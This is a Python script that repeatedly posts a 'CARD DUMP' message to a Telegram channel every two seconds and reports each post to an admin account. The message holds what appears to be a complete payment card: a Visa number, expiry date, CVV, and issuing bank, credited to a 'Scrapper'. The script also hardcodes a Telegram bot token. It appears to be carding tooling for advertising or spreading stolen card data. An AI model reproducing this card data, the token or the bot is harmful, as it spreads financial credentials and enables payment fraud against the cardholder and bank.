# -*- coding: utf-8 -*-
import time
import random
import requests
from telegram import Bot
from telegram.error import TelegramError

# ===== CONFIG (UPDATED INTERVAL TO 2 SEC) =====
BOT_TOKEN = "8839560847:AAF3IeRKYVerZUUHYV_ZgfItdm4BPEhcBYk"
CHANNEL_ID = "@hamody_up4"
ADMIN_ID = 6395195181
CARD_DATA = {
    "number": "4095131982174501",
    "month": "07",
    "year": "2035",
    "cvv": "580"
}
INTERVAL_SECONDS = 2
# ==============================================

def send_card_message(bot, channel, admin):
    text = (f"💰 CARD DUMP\n"
            f"Card: {CARD_DATA['number']}\n"
            f"Exp: {CARD_DATA['month']}/{CARD_DATA['year']}\n"
            f"CVV: {CARD_DATA['cvv']}\n"
            f"Bank: ICICI BANK LTD\n"
            f"Country: INDIA\n"
            f"Type: VISA DEBIT PLATINUM\n"
            f"----\n"
            f"Scrapper: Hamody")
    
    try:
        msg = bot.send_message(chat_id=channel, text=text)
        bot.send_message(chat_id=admin, text=f"[SUCCESS] Sent to {channel}\nMsg ID: {msg.message_id}")
        return True
    except TelegramError as e:
        bot.send_message(chat_id=admin, text=f"[ERROR] {str(e)}")
        return False

def main():
    bot = Bot(token=BOT_TOKEN)
    try:
        bot.get_me()
    except TelegramError:
        print("Error: invalid token or no internet.")
        return

    while True:
        success = send_card_message(bot, CHANNEL_ID, ADMIN_ID)
        delay = INTERVAL_SECONDS * random.uniform(0.9, 1.1)
        time.sleep(delay)

if __name__ == "__main__":
    main()